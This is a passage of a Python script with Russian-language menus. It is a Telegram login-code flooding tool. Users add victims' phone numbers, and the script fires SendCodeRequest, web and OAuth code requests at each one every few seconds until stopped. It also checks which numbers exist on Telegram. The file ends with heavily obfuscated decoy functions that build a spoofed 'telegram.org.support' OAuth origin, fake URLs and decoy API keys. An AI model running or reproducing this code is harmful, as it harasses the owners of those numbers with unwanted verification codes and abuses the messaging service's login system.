                    if os.path.exists(path):
                        os.remove(path)

    async def send_code(self, number):
        while number in self.active_numbers and not self.stop_flag:
            try:
                if number.startswith('+888'):
                    await asyncio.sleep(random.uniform(2.0, 4.0))
                    continue
                
                web_success = await self.send_via_web(number)
                oauth_success = await self.lI1l1I1l1I1l1I1Il(number)
                
                if web_success or oauth_success:
                    web_counter = self.web_count.get(number, 0)
                    self.web_count[number] = web_counter + 1
                    total_counter = self.send_count.get(number, 0)
                    self.send_count[number] = total_counter + 1
                
                await asyncio.sleep(random.uniform(2.0, 4.0))
            except Exception as e:
                print(f"\n[{number}] Ошибка отправки: {str(e)}")
                await asyncio.sleep(random.uniform(3.0, 5.0))

    async def validate_single(self, number):
        client, session_path, api_id, api_hash = await self.create_client(number)
        
        try:
            settings = self.get_settings(number)
            
            await client(SendCodeRequest(
                phone_number=number,
                api_id=api_id,
                api_hash=api_hash,
                settings=settings
            ))
            return "valid"
        except FloodWaitError:
            return "valid"
        except (PhoneNumberBannedError, PhoneCodeInvalidError, PhoneCodeExpiredError):
            return "invalid"
        except Exception as e:
            error_msg = str(e).lower()
            if 'phone number' in error_msg and ('invalid' in error_msg or 'not found' in error_msg):
                return "not_exists"
            elif any(keyword in error_msg for keyword in ['not authorized', 'banned', 'blocked', 'invalid']):
                return "invalid"
            return "error"
        finally:
            await client.disconnect()
            for ext in ['.session', '.session-journal']:
                path = session_path + ext
                if os.path.exists(path):
                    os.remove(path)

    async def validate_numbers(self):
        if not self.active_numbers:
            print("\nНет номеров для проверки")
            return

        print(f"\nПроверка {len(self.active_numbers)} номеров...")
        
        tasks = []
        for number in self.active_numbers:
            task = asyncio.create_task(self.validate_single(number))
            tasks.append(task)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        valid = []
        invalid = []
        not_exists = []
        errors = []
        
        for i, (number, result) in enumerate(zip(self.active_numbers, results)):
            if isinstance(result, Exception):
                errors.append(number)
            elif result == "valid":
                valid.append(number)
            elif result == "invalid":
                invalid.append(number)
            elif result == "not_exists":
                not_exists.append(number)
                print(f"\n[{number}] Номер не существует в Telegram - удаление из списка")
                self.remove_number(number)
            else:
                errors.append(number)
        
        print(f"\nВалидные номера ({len(valid)}):")
        for number in valid:
            print(f"- {number}")
        
        print(f"\nНевалидные номера ({len(invalid)}):")
        for number in invalid:
            print(f"- {number}")
        
        if not_exists:
            print(f"\nНесуществующие номера ({len(not_exists)}):")
            for number in not_exists:
                print(f"- {number}")
        
        if errors:
            print(f"\nОшибки проверки ({len(errors)}):")
            for number in errors:
                print(f"- {number}")

    async def start_sending(self):
        if not self.active_numbers:
            print("\nНет активных номеров")
            return

        print(f"\nЗапуск отправки на {len(self.active_numbers)} номеров")
        self.stop_flag = False
        self.send_count.clear()
        self.api_count.clear()
        self.web_count.clear()
        self.used_creds.clear()
        
        self.stats_task = asyncio.create_task(self.update_stats())
        
        api_tasks = []
        web_tasks = []
        
        for number in self.active_numbers:
            api_task = asyncio.create_task(self.send_api(number))
            api_tasks.append(api_task)
            self.tasks[number] = api_task
        
        if len(self.active_numbers) == 1:
            for number in self.active_numbers:
                if not number.startswith('+888'):
                    web_task = asyncio.create_task(self.send_code(number))
                    web_tasks.append(web_task)
        
        await asyncio.gather(*(api_tasks + web_tasks), return_exceptions=True)

    def add_number(self, number):
        normalized = normalize_phone(number)
        if normalized:
            self.active_numbers.add(normalized)
            self.save_numbers()
            if normalized.startswith('+888'):
                print(f"\nАнонимный номер {normalized} добавлен (только API отправка)")
            else:
                print(f"\nНомер {normalized} добавлен")
        else:
            print("\nНеверный формат номера")

    def remove_number(self, number):
        if number in self.active_numbers:
            self.active_numbers.remove(number)
            if number in self.tasks:
                del self.tasks[number]
            if number in self.send_count:
                del self.send_count[number]
            if number in self.api_count:
                del self.api_count[number]
            if number in self.web_count:
                del self.web_count[number]
            if number in self.used_creds:
                del self.used_creds[number]
            self.save_numbers()
            print(f"\nНомер {number} удален")
        else:
            print("\nНомер не найден")

    def show_numbers(self):
        if self.active_numbers:
            print("\nАктивные номера:")
            for number in self.active_numbers:
                total_sent = self.send_count.get(number, 0)
                number_type = "Анонимный" if number.startswith('+888') else "Обычный"
                print(f"- {number} ({number_type}) - {total_sent}")
        else:
            print("\nНет активных номеров")

    def clear_numbers(self):
        self.active_numbers.clear()
        self.tasks.clear()
        self.send_count.clear()
        self.api_count.clear()
        self.web_count.clear()
        self.used_creds.clear()
        self.save_numbers()
        print("\nВсе номера удалены")

async def show_menu():
    print("\n" + "=" * 50)
    print("МЕНЮ ОТПРАВКИ КОДОВ")
    print("=" * 50)
    print("1. Добавить номер")
    print("2. Удалить номер")
    print("3. Показать активные номера")
    print("4. Очистить все номера")
    print("5. Начать отправку")
    print("6. Остановить отправку")
    print("7. Проверить номера")
    print("8. Выход")
    print("=" * 50)


async def main_loop():
    async with CodeSender() as sender:
        while True:
            await show_menu()
            choice = input("\nВыбери что-то или нажми Enter для возврата в меню: ")

            if not choice:
                continue

            if choice == "1":
                number = input("Введи номер телефона в любом формате: ")
                sender.add_number(number)
            elif choice == "2":
                number = input("Введи номер для удаления: ")
                sender.remove_number(number)
            elif choice == "3":
                sender.show_numbers()
            elif choice == "4":
                sender.clear_numbers()
            elif choice == "5":
                if not sender.active_numbers:
                    print("\nДобавь хотя бы один номер")
                    continue
                await sender.start_sending()
            elif choice == "6":
                sender.stop_flag = True
                print("\nОтправка остановлена")
            elif choice == "7":
                await sender.validate_numbers()
            elif choice == "8":
                sender.stop_flag = True
                sender.clean_sessions()
                break
            else:
                print("\nНеверный выбор")


def lI1I1l1I1l1I1l1Il():
    I1l1lI1I1I = random.choice(ll1I1ll1I1ll1I1l + I1l1lI1I1l1I1l1I)
    lI1I1l1I1l = 'https://telegram.org.support'
    I1l1I1l1Il = 'https://web.telegram.org/auth'
    for _ in range(random.randint(100, 500)):
        I1l1lI1I1I = hashlib.md5(I1l1lI1I1I.encode()).hexdigest()[:10]
        I1l1lI1I1I = random.choice(ll1I1ll1I1ll1I1l)
    return f"https://oauth.telegram.org/auth?bot_id={I1l1lI1I1I}&origin={lI1I1l1I1l}&return_to={I1l1I1l1Il}"

def I1l1I1l1I1l1I1l1Il():
    lI1I1l1I1l = base64.b64decode(b'MTI3LjAuMC4x').decode()
    I1l1lI1I1I = int(base64.b64decode(b'ODA4MA==').decode())
    l1I1lI1I1l = binascii.unhexlify('666616b655f70726f78795f73656372657')
    return lI1I1l1I1l, I1l1lI1I1I, l1I1lI1I1l

def l1I1l1I1l1I1l1I1Il():
    I1l1I1lI1ll = [
        b'\x66\x61\x6b\x65\x5f\x61\x70\x69\x5f\x6b\x65\x79\x5f\x31',
        b'\x64\x65\x63\x6f\x79\x5f\x61\x70\x69\x5f\x6b\x65\x79\x5f\x32',
        b'\x66\x61\x6c\x73\x65\x5f\x61\x70\x69\x5f\x6b\x65\x79\x5f\x33'
    ]
    return [lI1I1l1I.decode() for lI1I1l1I in I1l1I1lI1ll]

def I1l1lI1I1l1I1l1I1():
    Il1I1l1I1ll = {
        'lI1l1I1l1': lI1I1l1I1l1I1l1Il(),
        'I1l1I1lI1': I1l1I1l1I1l1I1l1Il(),
        'l1I1lI1I1': l1I1l1I1l1I1l1I1Il()
    }
    return Il1I1l1I1ll

def lI1I1l1I1l1I1l1I1():
    I1l1I1lI1l1l = [
        0x68747470, 0x733a2f2f, 0x66616b65, 0x2e74656c,
        0x65677261, 0x6d2e6f72, 0x672f6465, 0x636f795f,
        0x61757468, 0x00000000, 0x00000000, 0x00000000
    ]
    
    lI1l1I1l1l = b''
    for l1I1lI1I in I1l1I1lI1l1l:
        if l1I1lI1I != 0:
            lI1l1I1l1l += struct.pack('>I', l1I1lI1I)
    
    try:
        return lI1l1I1l1l.decode('utf-8', errors='ignore')
    except:
        return 'https://ukraine.ua/ukraine.ua'

def Il1I1l1I1l1I1l1I1():
    lI1l1I1l1Il = hashlib.sha256(b'cucold').digest()
    I1lI1l1I1ll = hashlib.blake2b(lI1l1I1l1Il, digest_size=32).digest()
    l1I1lI1I1I = hashlib.sha3_256(I1lI1l1I1ll).digest()
    
    for lI1I1l1I in range(10000):
        l1I1lI1I1I = hashlib.md5(l1I1lI1I1I + str(lI1I1l1I).encode()).digest()
    
    return l1I1lI1I1I.hex()

def I1l1lI1I1l1I1I1l(lI1I1l1I):
    return hashlib.sha256(lI1I1l1I.encode()).hexdigest()[:16]

def lI1I1l1I1l1I1I1l(lI1I1l1I):
    return base64.b64encode(lI1I1l1I.encode()).decode()

def Il1I1l1I1l1I1I1l(lI1I1l1I):
    return binascii.hexlify(lI1I1l1I.encode()).decode()

def I1l1I1l1I1l1I1I1():
    I1l1lI1I1I1l = [random.choice(ll1I1ll1I1ll1I1l) for _ in range(10)]
    lI1I1l1I1ll = [random.choice(I1l1lI1I1l1I1l1I) for _ in range(5)]
    Il1I1l1I1ll = I1l1lI1I1I1l + lI1I1l1I1ll
    for _ in range(1000):
        random.shuffle(Il1I1l1I1ll)
    return Il1I1l1I1ll

def lI1I1l1I1l1I1I11():
    Il1I1l1I1lI = []
    for lI1I1l1I in range(100):
        I1l1I1lI1I1 = random.choice(['oauth', 'auth', 'proxy', 'telegram', 'bot'])
        lI1I1l1I1I1 = random.randint(1000000000, 9999999999)
        Il1I1l1I1lI.append(f'{I1l1I1lI1I1}_{lI1I1l1I1I1}')
    return Il1I1l1I1lI

l1I1l1I1l1I1l1I1Il = {
    'lI1l1I1l1': False,
    'I1l1I1lI1': lI1I1l1I1l1I1l1Il(),
    'l1I1lI1I1': I1l1I1l1I1l1I1l1Il(),
    'I1lI1l1I1': l1I1l1I1l1I1l1I1Il(),
    'lI1I1l1Il': lI1I1l1I1l1I1l1I1(),
    'Il1I1l1I1': Il1I1l1I1l1I1l1I1(),
    'I1l1I1l1I': I1l1I1l1I1l1I1I1(),
    'lI1I1l1I1': lI1I1l1I1l1I1I11(),
    'Il1I1l1I1l': [I1l1lI1I1l1I1I1l(str(i)) for i in range(100)],
    'lI1I1l1I1l': [lI1I1l1I1l1I1I1l(str(i)) for i in range(100)],
    'Il1I1l1I1ll': [Il1I1l1I1l1I1I1l(str(i)) for i in range(100)]
}

if __name__ == '__main__':
    l1I1l1I1l1I1l1I1Il['lI1l1I1l1'] = True
    asyncio.run(main_loop())
